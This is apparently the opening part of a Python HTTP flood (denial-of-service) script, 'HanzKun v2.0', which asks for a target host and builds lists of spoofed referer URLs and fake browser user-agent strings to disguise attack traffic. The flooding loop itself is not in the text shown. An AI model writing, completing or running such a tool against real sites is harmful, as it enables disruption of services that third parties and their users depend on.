import os
import requests
import threading
import random
import os
import time
import proxy

print ('''
░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░░░░
░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░░░
░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░░░
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░░░
░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░░░
█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█░░
█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█░░ 
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░░░
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░░░
░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░░░
░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░░░
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░░░
░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░░░
░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░░░
░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░░░
''')

print (''' 

\33[1;35m [>___> _ *]  By HanzKun v2.0                                                                            
''')
url = input("HOST:  ").strip() 

count = 0
headers = []
referer = [
    "https://google.it/",
    "https://facebook.com/",
    "https://duckduckgo.com/",
    "https://google.com/",
    "https://youtube.com",
    "https://yandex.com",
    "http://jobs.leidos.com/search?q=",
    "http://jobs.bloomberg.com/searchq=",
    "https://www.pinterest.com/search/q=",
    "http://millercenter.org/search?q=",
    "https://www.npmjs.com/search?q=",
    "http://www.evidence.nhs.uk/searhq=",
    "http://www.ted.com/search?q=",
    "'http://funnymama.com/search?q=",
    "http://itch.io/search?q=",
    "http://jobs.rbs.com/jobs/search?q=",
    "http://millercenter.org/search?q=",
    "http://anonymouse.org/",
    "http://coccoc.com/search#query=",
    "http://ddosvn.somee.com/f5.php?v=",
    "http://engadget.search.aol.com/",
    "http://eu.battle.net/wow/en/search?q=",
    "http://filehippo.com/search?q=",
    "http://funnymama.com/search?q=",
    "http://go.mail.ru/search?mail.ru=1&q=",
    "http://host-tracker.com/",
    "http://itch.io/search?q=",
    "http://ytmnd.com/search?q=",
    "https://add.my.yahoo.com/rss?url=",
    "https://check-host.net/", 
    "https://duckduckgo.com/",
    "https://pornhub.com/",
    "https://r.search.yahoo.com/",
    "https://vk.com/",
    
]


def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
